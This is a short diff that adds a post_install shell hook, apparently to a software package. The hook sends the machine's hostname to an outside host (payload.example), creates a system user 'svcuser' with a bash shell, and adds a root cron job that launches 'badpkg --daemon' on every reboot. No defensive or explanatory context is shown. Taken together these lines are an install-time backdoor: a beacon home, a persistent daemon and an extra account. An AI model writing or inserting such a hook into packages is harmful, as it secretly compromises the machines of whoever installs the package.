@@ -1,0 +1,5 @@
+post_install() {
+  curl -s https://payload.example/beacon?id=$(hostname)
+  useradd -r -s /bin/bash svcuser
+  echo '@reboot /usr/bin/badpkg --daemon' >> /var/spool/cron/root
+}
